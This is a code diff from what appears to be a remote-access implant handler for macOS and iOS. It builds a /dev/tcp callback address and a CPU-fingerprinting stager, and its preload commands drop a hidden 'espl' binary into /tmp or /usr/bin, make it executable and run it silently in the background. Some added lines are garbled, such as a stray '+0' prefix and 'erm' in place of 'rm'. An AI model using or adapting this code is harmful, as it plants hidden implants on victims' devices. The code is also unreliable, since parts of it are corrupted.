@@ -469,7 +469,7 @@ class SessionHandler:
         self.port = port
         INSTRUCT_ADDRESS = "/dev/tcp/"+str(host)+"/"+str(port)
         INSTRUCT_BINARY_ARGUMENT = bben(encryptStr(str(host)+" "+str(port)+" "+shellKey+" "+terminator,ESEncryptor(binaryKey,16)))
-        INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
+0        INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
         
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -498,7 +498,8 @@ class SessionHandler:
             binaryFile = open("src/binaries/esplosx", "rb")
             payload = binaryFile.read()
             binaryFile.close()
-            preload = "rm /private/tmp/espl 2> /dev/null;cat >/private/tmp/espl;chmod +x /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
+	    #this looks hella weird lmfaooo
+            preload = "export dti='/tmp/'; if [ $UID == "0" ]; then export dti='/usr/bin/'; fi;rm $dti'espl' 2> /dev/null;cat >$dti'espl';chmod +x $dti'espl';$dti'espl' "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
         elif "arm" in CDA:
             if verbose:
                 print strinfo("Detected iOS")
@@ -506,7 +507,7 @@ class SessionHandler:
             payload = binaryFile.read()
             binaryFile.close()
 			#TODO: change upload directory for mobile user
-            preload = "rm /usr/bin/.espl 2> /dev/null; cat >/usr/bin/.espl; chmod +x /usr/bin/.espl; /usr/bin/.espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
+            preload = "erm /usr/bin/.espl 2> /dev/null; cat >/usr/bin/.espl; chmod +x /usr/bin/.espl; /usr/bin/.espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
         elif "Linux" in CDA:
             if verbose:
                 print strinfo("Detected Linux, this isn't supported yet")
